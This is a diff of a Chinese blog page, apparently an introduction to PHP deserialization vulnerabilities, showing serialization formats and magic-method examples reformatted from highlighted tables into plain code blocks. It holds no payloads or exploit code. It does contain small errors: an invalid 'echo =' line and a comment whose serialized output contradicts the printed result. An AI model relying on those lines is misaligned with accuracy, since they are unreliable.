@@ -219,9 +219,41 @@
 </li>
 </ul>
 <p><br></p>
-<h3 id="0x02-序列化格式"><a href="#0x02-序列化格式" class="headerlink" title="0x02 序列化格式"></a>0x02 序列化格式</h3><p>例子如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $x;</span><br><span class="line">        <span class="keyword">private</span> $y;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x, $y)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;x = $x;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;y = $y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $number = <span class="number">10</span>;</span><br><span class="line">    $str = <span class="string">'Lethe'</span>;</span><br><span class="line">    $bool = <span class="keyword">true</span>;</span><br><span class="line">    $null = <span class="keyword">NULL</span>;</span><br><span class="line">    $arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">1</span>, <span class="string">'b'</span> =&gt; <span class="number">2</span>);</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">'lethe'</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    var_dump(serialize($number));	<span class="comment">//string(5) "i:10;"</span></span><br><span class="line">    var_dump(serialize($str));		<span class="comment">//string(12) "s:5:"Lethe";"</span></span><br><span class="line">    var_dump(serialize($bool));		<span class="comment">//string(4) "b:1;"</span></span><br><span class="line">    var_dump(serialize($null));		<span class="comment">//string(2) "N;"</span></span><br><span class="line">    var_dump(serialize($arr));		<span class="comment">//string(30) "a:2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;"</span></span><br><span class="line">    var_dump(serialize($a));		<span class="comment">//string(73) "O:1:"A":4:&#123;s:4:"data";N;s:7:" A pass";N;s:1:"x";s:5:"lethe";s:1:"y";b:1;&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>输出结果如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">string</span>(5) "<span class="selector-tag">i</span><span class="selector-pseudo">:10</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(12) "<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"Lethe"</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(4) "<span class="selector-tag">b</span><span class="selector-pseudo">:1</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(2) "<span class="selector-tag">N</span>;"</span><br><span class="line"><span class="selector-tag">string</span>(30) "<span class="selector-tag">a</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"b"</span>;<span class="attribute">i</span>:<span class="number">2</span>;&#125;"</span><br><span class="line"><span class="selector-tag">string</span>(47) "<span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"x"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"lethe"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">" A y"</span>;<span class="attribute">b</span>:<span class="number">1</span>;&#125;"</span><br></pre></td></tr></table></figure></p>
-<p>可以看到不同的php数据结构序列化后结构如下：<br>所以序列化对于不同类型得到的字符串格式为：</p>
+<h3 id="0x02-序列化格式"><a href="#0x02-序列化格式" class="headerlink" title="0x02 序列化格式"></a>0x02 序列化格式</h3><p>例子如下：</p>
+<pre><code class="php">&lt;?php
+    class A {
+        public $x;
+        private $y;
+
+        public function __construct($x, $y)
+        {
+            $this-&gt;x = $x;
+            $this-&gt;y = $y;
+        }
+    }
+    $number = 10;
+    $str = &#39;Lethe&#39;;
+    $bool = true;
+    $null = NULL;
+    $arr = array(&#39;a&#39; =&gt; 1, &#39;b&#39; =&gt; 2);
+    $a = new A(&#39;lethe&#39;, true);
+
+    var_dump(serialize($number));    //string(5) &quot;i:10;&quot;
+    var_dump(serialize($str));        //string(12) &quot;s:5:&quot;Lethe&quot;;&quot;
+    var_dump(serialize($bool));        //string(4) &quot;b:1;&quot;
+    var_dump(serialize($null));        //string(2) &quot;N;&quot;
+    var_dump(serialize($arr));        //string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot;
+    var_dump(serialize($a));        //string(73) &quot;O:1:&quot;A&quot;:4:{s:4:&quot;data&quot;;N;s:7:&quot; A pass&quot;;N;s:1:&quot;x&quot;;s:5:&quot;lethe&quot;;s:1:&quot;y&quot;;b:1;}&quot;
+?&gt;
+</code></pre>
+<p>输出结果如下：</p>
+<pre><code>string(5) &quot;i:10;&quot;
+string(12) &quot;s:5:&quot;Lethe&quot;;&quot;
+string(4) &quot;b:1;&quot;
+string(2) &quot;N;&quot;
+string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot;
+string(47) &quot;O:1:&quot;A&quot;:2:{s:1:&quot;x&quot;;s:5:&quot;lethe&quot;;s:4:&quot; A y&quot;;b:1;}&quot;
+</code></pre><p>可以看到不同的php数据结构序列化后结构如下：<br>所以序列化对于不同类型得到的字符串格式为：</p>
 <ul>
 <li>String : <code>s:字符串长度:&quot;字符串值&quot;;</code></li>
 <li>Integer : <code>i:数值;</code></li>
@@ -230,9 +262,33 @@
 <li>Array : <code>a:数组大小:{键的描述;值的描述;键的描述;值的描述; ...}  （描述值同String或Int型的序列化格式）</code></li>
 <li>Object : <code>O:类名长度:&quot;类名&quot;:属性数量:{属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值; ...}</code></li>
 </ul>
-<p>除此之外，还要注意类内不同限定的属性及方法序列化后格式也不同，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $a=<span class="string">"private"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $b=<span class="string">"protected"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $c=<span class="string">"public"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $aa = <span class="keyword">new</span> A();</span><br><span class="line">    $bb = <span class="keyword">new</span> B();</span><br><span class="line">    $cc = <span class="keyword">new</span> C();</span><br><span class="line">    <span class="keyword">echo</span> serialize($aa);</span><br><span class="line">    <span class="keyword">echo</span> serialize($bb);</span><br><span class="line">    <span class="keyword">echo</span> serialize($cc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>输出如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">" A a"</span>;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"private"</span>;&#125;</span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"B"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">" * b"</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"protected"</span>;&#125;</span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"C"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"c"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"public"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><br></p>
+<p>除此之外，还要注意类内不同限定的属性及方法序列化后格式也不同，如下：</p>
+<pre><code class="php">&lt;?php
+    class A
+    {
+        private $a=&quot;private&quot;;
+    }
+    class B
+    {
+        protected $b=&quot;protected&quot;;
+    }
+    class C
+    {
+        public $c=&quot;public&quot;;
+    }
+    $aa = new A();
+    $bb = new B();
+    $cc = new C();
+    echo serialize($aa);
+    echo serialize($bb);
+    echo serialize($cc);
+?&gt;
+</code></pre>
+<p>输出如下：</p>
+<pre><code>O:1:&quot;A&quot;:1:{s:4:&quot; A a&quot;;s:7:&quot;private&quot;;}
+O:1:&quot;B&quot;:1:{s:4:&quot; * b&quot;;s:9:&quot;protected&quot;;}
+O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:6:&quot;public&quot;;}
+</code></pre><p><br></p>
 <h3 id="0x03-魔术方法"><a href="#0x03-魔术方法" class="headerlink" title="0x03 魔术方法"></a>0x03 魔术方法</h3><h6 id="（1）PHP16个魔术方法"><a href="#（1）PHP16个魔术方法" class="headerlink" title="（1）PHP16个魔术方法"></a>（1）PHP16个魔术方法</h6><p>PHP中把以双下划线__开头的方法称为魔术方法(Magic methods)，这些方法在达到某些条件时将会自动被调用：</p>
 <ul>
 <li><p>__construct()，类的构造函数，:当一个类被创建时自动调用</p>
@@ -270,49 +326,253 @@
 </ul>
 <p>具体调用情况可以参考：<a href="https://segmentfault.com/a/1190000007250604#articleHeader4" target="_blank" rel="noopener">https://segmentfault.com/a/1190000007250604#articleHeader4</a></p>
 <p>其实在反序列化漏洞中经常利用的有：<code>__construct()</code>，<code>__destruct()</code>，<code>__sleep()</code>，<code>__wakeup()</code>，<code>__toString()</code>，<code>__invoke()</code>，<code>__call()</code>这几个，所以下面针对这几个作具体说明。</p>
-<h6 id="（2）-construct-调用方式"><a href="#（2）-construct-调用方式" class="headerlink" title="（2）__construct()调用方式"></a>（2）__construct()调用方式</h6><p>在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a construct function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>运行结果：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is <span class="keyword">a</span> construct <span class="function"><span class="keyword">function</span></span></span><br></pre></td></tr></table></figure></p>
-<h6 id="（3）-destruct-调用方式"><a href="#（3）-destruct-调用方式" class="headerlink" title="（3）__destruct()调用方式"></a>（3）__destruct()调用方式</h6><p>在每个类中都有一个析构方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的析构方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a construct function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a destruct function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>运行结果：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This <span class="keyword">is</span> a construct <span class="keyword">function</span></span><br><span class="line">This <span class="keyword">is</span> a destruct <span class="keyword">function</span></span><br></pre></td></tr></table></figure></p>
-<h6 id="（4）-sleep-调用方式"><a href="#（4）-sleep-调用方式" class="headerlink" title="（4）__sleep()调用方式"></a>（4）__sleep()调用方式</h6><ul>
+<h6 id="（2）-construct-调用方式"><a href="#（2）-construct-调用方式" class="headerlink" title="（2）__construct()调用方式"></a>（2）__construct()调用方式</h6><p>在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。</p>
+<pre><code class="php">&lt;?php
+    class A
+    {
+        function __construct()
+        {
+            echo &quot;This is a construct function&quot;;
+            //...
+        }
+    }
+    $a = new A();  
+?&gt;
+</code></pre>
+<p>运行结果：</p>
+<pre><code>This is a construct function
+</code></pre><h6 id="（3）-destruct-调用方式"><a href="#（3）-destruct-调用方式" class="headerlink" title="（3）__destruct()调用方式"></a>（3）__destruct()调用方式</h6><p>在每个类中都有一个析构方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的析构方法。</p>
+<pre><code class="php">&lt;?php
+    class A
+    {
+        function __construct()
+        {
+            echo &quot;This is a construct function&quot;;
+            //...
+        }
+        function __destruct()
+        {
+            echo &quot;This is a destruct function&quot;;
+            //...
+        }
+    }
+    $a = new A();  
+?&gt;
+</code></pre>
+<p>运行结果：</p>
+<pre><code>This is a construct function
+This is a destruct function
+</code></pre><h6 id="（4）-sleep-调用方式"><a href="#（4）-sleep-调用方式" class="headerlink" title="（4）__sleep()调用方式"></a>（4）__sleep()调用方式</h6><ul>
 <li><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>；如果存在，则该方法会优先被调用，然后才执行序列化操作。</p>
 </li>
 <li><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
 </li>
 <li><p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;	</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a sleep function"</span>;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'test'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);  </span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
+<pre><code class="php">&lt;?php
+  class A
+  {
+      private $test;
+
+      public function __construct($test)
+      {
+          $this-&gt;test = $test;
+      }
+      public function __sleep()
+      {    
+          echo &quot;This is a sleep function&quot;;
+          // ...
+          return array(&#39;test&#39;); // 这里必须返回一个数值，里边的元素表示返回的属性名称
+      }
+  }
+  $a = new A(&quot;Lethe&quot;);  
+  echo serialize($a);
+?&gt;
+</code></pre>
+<p>运行结果：</p>
+<pre><code>This is a sleep function
+O:1:&quot;A&quot;:1:{s:7:&quot; A test&quot;;s:5:&quot;Lethe&quot;;}
+</code></pre></li>
 </ul>
-<p>运行结果：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">This</span> <span class="selector-tag">is</span> <span class="selector-tag">a</span> <span class="selector-tag">sleep</span> <span class="selector-tag">function</span></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">" A test"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"Lethe"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
 <h6 id="（5）-wakeup-调用方式"><a href="#（5）-wakeup-调用方式" class="headerlink" title="（5）__wakeup()调用方式"></a>（5）__wakeup()调用方式</h6><p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a sleep function"</span>;</span><br><span class="line">            <span class="comment">// ....</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'test'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"This is a wakeup function"</span>;</span><br><span class="line">            <span class="comment">// ....</span></span><br><span class="line">            <span class="comment">// 这里不需要返回数组</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);  </span><br><span class="line">    $b = serialize($a);     <span class="comment">//O:1:"A":1:&#123;s:7:" A test";s:5:"Lethe";&#125;</span></span><br><span class="line">    $c = unserialize($b);   <span class="comment">//unserialize之前先调用了__wakeup</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行结果：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This <span class="keyword">is</span> a sleep <span class="keyword">function</span></span><br><span class="line">This <span class="keyword">is</span> a wakeup <span class="keyword">function</span></span><br></pre></td></tr></table></figure></p>
-<h6 id="（6）-toString-调用方式"><a href="#（6）-toString-调用方式" class="headerlink" title="（6）__toString()调用方式"></a>（6）__toString()调用方式</h6><ul>
+<pre><code class="php">&lt;?php
+    class A
+    {
+        private $test;
+
+        public function __construct($test)
+        {
+            $this-&gt;test = $test;
+        }
+        public function __sleep()
+        {
+            echo &quot;This is a sleep function&quot;;
+            // ....
+            return array(&#39;test&#39;); // 这里必须返回一个数值，里边的元素表示返回的属性名称
+        }
+        public function __wakeup()
+        {
+            echo &quot;This is a wakeup function&quot;;
+            // ....
+            // 这里不需要返回数组
+        }
+    }
+    $a = new A(&quot;Lethe&quot;);  
+    $b = serialize($a);     //O:1:&quot;A&quot;:1:{s:7:&quot; A test&quot;;s:5:&quot;Lethe&quot;;}
+    $c = unserialize($b);   //unserialize之前先调用了__wakeup
+?&gt;
+</code></pre>
+<p>运行结果：</p>
+<pre><code>This is a sleep function
+This is a wakeup function
+</code></pre><h6 id="（6）-toString-调用方式"><a href="#（6）-toString-调用方式" class="headerlink" title="（6）__toString()调用方式"></a>（6）__toString()调用方式</h6><ul>
 <li><p><code>__toString()</code> 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应时该显示些什么，即调用其函数内容。</p>
 </li>
 <li><p><code>__toString()</code> 方法必须返回一个字符串，否则将发出一条 <code>E_RECOVERABLE_ERROR</code> 级别的致命错误。</p>
 </li>
 <li>不能在<code>__toString()</code> 方法中抛出异常。</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $str = <span class="string">"This is a toString function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="keyword">return</span> $str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);  </span><br><span class="line">    <span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行结果：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is <span class="keyword">a</span> toString <span class="function"><span class="keyword">function</span></span></span><br></pre></td></tr></table></figure></p>
-<h6 id="（7）-invoke-调用方式"><a href="#（7）-invoke-调用方式" class="headerlink" title="（7）__invoke()调用方式"></a>（7）__invoke()调用方式</h6><ul>
+<pre><code class="php">&lt;?php
+    class A
+    {
+        private $test;
+
+        public function __construct($test)
+        {
+            $this-&gt;test = $test;
+        }
+        function __toString()
+        {
+            $str = &quot;This is a toString function&quot;;
+            //...
+            return $str;
+        }
+    }
+    $a = new A(&quot;Lethe&quot;);  
+    echo $a;
+?&gt;
+</code></pre>
+<p>运行结果：</p>
+<pre><code>This is a toString function
+</code></pre><h6 id="（7）-invoke-调用方式"><a href="#（7）-invoke-调用方式" class="headerlink" title="（7）__invoke()调用方式"></a>（7）__invoke()调用方式</h6><ul>
 <li><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用，即<code>$obj = new class(); $obj();</code>时该做什么。</p>
 </li>
 <li><p>本特性只在 PHP 5.3.0 及以上版本有效。</p>
 </li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> = <span class="string">"This is a invoke function"</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);</span><br><span class="line">    $a();       <span class="comment">//$a是一个对象，但却用$a()调用方法的方式来调用它</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+    class A
+    {
+        private $test;
+
+        public function __construct($test)
+        {
+            $this-&gt;test = $test;
+        }
+        function __invoke()
+        {
+            echo = &quot;This is a invoke function&quot;;
+            //...
+        }
+    }
+    $a = new A(&quot;Lethe&quot;);
+    $a();       //$a是一个对象，但却用$a()调用方法的方式来调用它
+?&gt;
+
+</code></pre>
 <h6 id="（8）-call-调用方式"><a href="#（8）-call-调用方式" class="headerlink" title="（8）__call()调用方式"></a>（8）__call()调用方式</h6><ul>
 <li><code>__call()</code>方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</li>
